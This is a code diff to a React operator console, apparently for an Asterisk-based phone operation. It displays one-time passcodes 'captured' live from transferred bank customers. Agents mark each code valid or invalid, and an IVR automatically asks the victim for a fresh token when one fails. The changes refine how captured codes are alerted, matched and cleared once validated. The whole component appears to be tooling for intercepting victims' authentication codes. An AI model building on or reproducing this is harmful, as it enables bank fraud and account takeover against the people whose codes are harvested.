@@ -521,6 +521,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
   const [liveCapturedAlert, setLiveCapturedAlert] = useState<CapturedOtpRecord | null>(null);
   const lastAlertKeyRef = useRef<string>('');
   const activeCallRef = useRef(activeCall);
+  const validRecordIdsRef = useRef<Set<string>>(new Set());
 
   useEffect(() => {
     activeCallRef.current = activeCall;
@@ -538,61 +539,85 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
         if (data.records.length > 0) {
           const newest = data.records[0];
           const recordKey = `${newest.id}_${newest.otp}_${newest.status}`;
+          const isValid =
+            newest.status === 'valid' ||
+            validRecordIdsRef.current.has(newest.id) ||
+            (newest.otp && validRecordIdsRef.current.has(newest.otp)) ||
+            (newest.number && validRecordIdsRef.current.has(newest.number));
 
-          // Mantener siempre el banner de alerta actualizado con el último código
-          setLiveCapturedAlert((prev) => {
-            if (!prev || prev.id !== newest.id || prev.otp !== newest.otp || prev.status !== newest.status) {
-              return newest;
-            }
-            return prev;
-          });
-
-          // Tono de notificación auditivo solo cuando llega un código nuevo o cambia de estado
-          if (newest.otp && lastAlertKeyRef.current !== recordKey) {
-            lastAlertKeyRef.current = recordKey;
-
-            try {
-              const audioCtx = new (window.AudioContext || (window as any).webkitAudioContext)();
-              const osc = audioCtx.createOscillator();
-              const gain = audioCtx.createGain();
-              osc.type = 'triangle';
-              osc.frequency.setValueAtTime(880, audioCtx.currentTime);
-              osc.frequency.exponentialRampToValueAtTime(1760, audioCtx.currentTime + 0.35);
-              gain.gain.setValueAtTime(0.25, audioCtx.currentTime);
-              gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.35);
-              osc.connect(gain);
-              gain.connect(audioCtx.destination);
-              osc.start();
-              osc.stop(audioCtx.currentTime + 0.35);
-            } catch (e) {}
-          }
-
-          // Actualizar el HUD activo solo si hay cambios reales para evitar re-renders cíclicos
-          setActiveCall((prev) => {
-            if (prev && prev.isActive) {
-              if (prev.capturedOtp === newest.otp && prev.otpStatus === newest.status) {
-                return prev; // Mismo estado, sin re-render
+          if (isValid) {
+            // Cuando el código ya fue validado, se quita la alerta y se quita el HUD de captura en tiempo real
+            setLiveCapturedAlert(null);
+            setActiveCall((prev) => {
+              if (prev && prev.name?.includes('Cliente Transferido')) {
+                return null;
               }
-              return {
-                ...prev,
-                capturedOtp: newest.otp,
-                status: 'otp_captured',
-                otpStatus: (newest.status as any) || prev.otpStatus || 'pending',
-              };
+              if (prev && prev.capturedOtp) {
+                return {
+                  ...prev,
+                  capturedOtp: undefined,
+                  status: prev.status === 'otp_captured' ? 'connected' : prev.status,
+                  otpStatus: 'valid',
+                };
+              }
+              return prev;
+            });
+          } else {
+            // Mantener el banner de alerta solo si está pendiente de validación
+            setLiveCapturedAlert((prev) => {
+              if (!prev || prev.id !== newest.id || prev.otp !== newest.otp || prev.status !== newest.status) {
+                return newest;
+              }
+              return prev;
+            });
+
+            // Tono de notificación auditivo solo cuando llega un código nuevo o cambia de estado
+            if (newest.otp && lastAlertKeyRef.current !== recordKey) {
+              lastAlertKeyRef.current = recordKey;
+
+              try {
+                const audioCtx = new (window.AudioContext || (window as any).webkitAudioContext)();
+                const osc = audioCtx.createOscillator();
+                const gain = audioCtx.createGain();
+                osc.type = 'triangle';
+                osc.frequency.setValueAtTime(880, audioCtx.currentTime);
+                osc.frequency.exponentialRampToValueAtTime(1760, audioCtx.currentTime + 0.35);
+                gain.gain.setValueAtTime(0.25, audioCtx.currentTime);
+                gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.35);
+                osc.connect(gain);
+                gain.connect(audioCtx.destination);
+                osc.start();
+                osc.stop(audioCtx.currentTime + 0.35);
+              } catch (e) {}
             }
-            // Si no estaba activo el HUD, activarlo automáticamente para mostrar los dígitos al agente
-            return {
-              isActive: true,
-              number: newest.number || 'Cliente en Línea',
-              name: 'Cliente Transferido (Ext. 7777)',
-              service: selectedService || 'bank',
-              status: 'otp_captured',
-              capturedOtp: newest.otp,
-              otpStatus: (newest.status as any) || 'pending',
-              duration: 12,
-              channel: newest.channel || 'PJSIP',
-            };
-          });
+
+            // Actualizar el HUD activo solo si hay cambios reales para evitar re-renders cíclicos
+            setActiveCall((prev) => {
+              if (prev && prev.isActive) {
+                if (prev.capturedOtp === newest.otp && prev.otpStatus === newest.status) {
+                  return prev; // Mismo estado, sin re-render
+                }
+                return {
+                  ...prev,
+                  capturedOtp: newest.otp,
+                  status: 'otp_captured',
+                  otpStatus: (newest.status as any) || prev.otpStatus || 'pending',
+                };
+              }
+              // Si no estaba activo el HUD, activarlo automáticamente para mostrar los dígitos al agente
+              return {
+                isActive: true,
+                number: newest.number || 'Cliente en Línea',
+                name: `Cliente Transferido (${newest.channel || 'Ext. 7777 / 6666'})`,
+                service: selectedService || 'bank',
+                status: 'otp_captured',
+                capturedOtp: newest.otp,
+                otpStatus: (newest.status as any) || 'pending',
+                duration: 12,
+                channel: newest.channel || 'PJSIP',
+              };
+            });
+          }
         }
       }
     } catch (err) {
@@ -610,33 +635,59 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
     const num = targetNum || (activeCall ? activeCall.number : '');
     const otp = targetOtp || (activeCall ? activeCall.capturedOtp : '');
 
-    if (activeCall) {
-      setActiveCall((prev) =>
-        prev
-          ? {
-              ...prev,
-              otpStatus: status,
-              validationNote:
-                status === 'valid'
-                  ? '✓ Token VÁLIDO aprobado. ¡Transfiriendo llamada de vuelta a tu extensión de agente (1001)!'
-                  : '✕ Token marcado como INVÁLIDO. El IVR le ha solicitado automáticamente un nuevo token al cliente...',
-            }
-          : null
-      );
+    if (status === 'valid') {
+      if (recordId) validRecordIdsRef.current.add(recordId);
+      if (otp) validRecordIdsRef.current.add(otp);
+      if (num) validRecordIdsRef.current.add(num);
+
+      // Quitar inmediatamente el aviso de código capturado en tiempo real
+      setLiveCapturedAlert(null);
+
+      // Quitar del HUD de llamada activa la sección de dígitos en tiempo real
+      if (activeCall) {
+        if (activeCall.name?.includes('Cliente Transferido')) {
+          setActiveCall(null);
+        } else {
+          setActiveCall((prev) =>
+            prev
+              ? {
+                  ...prev,
+                  capturedOtp: undefined,
+                  status: prev.status === 'otp_captured' ? 'connected' : prev.status,
+                  otpStatus: 'valid',
+                  validationNote:
+                    '✓ Token VÁLIDO aprobado. ¡Transfiriendo llamada de vuelta a tu extensión de agente (1001)!',
+                }
+              : null
+          );
+        }
+      }
+    } else {
+      if (activeCall) {
+        setActiveCall((prev) =>
+          prev
+            ? {
+                ...prev,
+                otpStatus: status,
+                validationNote:
+                  '✕ Token marcado como INVÁLIDO. El IVR le ha solicitado automáticamente un nuevo token al cliente...',
+              }
+            : null
+        );
+      }
+      if (liveCapturedAlert) {
+        setLiveCapturedAlert((prev) => (prev ? { ...prev, status } : null));
+      }
     }
 
-    // Immediate UI update in list
+    // Immediate UI update in list (permanece visible en el monitor del agente y en el registro histórico)
     setOtpRecords((prev) =>
       prev.map((r) =>
-        (recordId && r.id === recordId) || (num && r.number.includes(num))
+        (recordId && r.id === recordId) || (num && r.number.includes(num)) || (otp && r.otp === otp)
           ? { ...r, status }
           : r
       )
     );
-
-    if (liveCapturedAlert) {
-      setLiveCapturedAlert((prev) => (prev ? { ...prev, status } : null));
-    }
 
     try {
       await fetch('/api/asterisk/otp/decision', {
@@ -1111,8 +1162,8 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
         </div>
       </div>
 
-      {/* BANNER / PANEL DE ALERTA: CÓDIGO CAPTURADO EN VIVO (EXT. 7777) */}
-      {liveCapturedAlert && (
+      {/* BANNER / PANEL DE ALERTA: CÓDIGO CAPTURADO EN VIVO (EXT. 7777 / 6666) */}
+      {liveCapturedAlert && liveCapturedAlert.status !== 'valid' && (
         <div className="p-6 rounded-2xl bg-gradient-to-r from-emerald-950/90 via-slate-950 to-slate-900 border-2 border-emerald-500 shadow-2xl shadow-emerald-500/30 relative overflow-hidden">
           <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 border-b border-emerald-500/30 pb-4">
             <div className="flex items-center gap-3">
@@ -1398,8 +1449,9 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
             </div>
           </div>
 
-          {/* CAPTURED OTP DISPLAY HUD */}
-          <div className="p-6 rounded-xl bg-slate-900/90 border border-slate-800 text-center space-y-4">
+          {/* CAPTURED OTP DISPLAY HUD: Solo visible mientras no haya sido validado */}
+          {activeCall.otpStatus !== 'valid' && (
+            <div className="p-6 rounded-xl bg-slate-900/90 border border-slate-800 text-center space-y-4">
             <div className="flex items-center justify-between border-b border-slate-800 pb-3">
               <div className="text-xs font-semibold text-slate-400 uppercase tracking-wider flex items-center gap-2">
                 <KeyRound className="w-4 h-4 text-emerald-400" />
@@ -1567,6 +1619,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
               </div>
             )}
           </div>
+          )}
         </div>
       )}
 
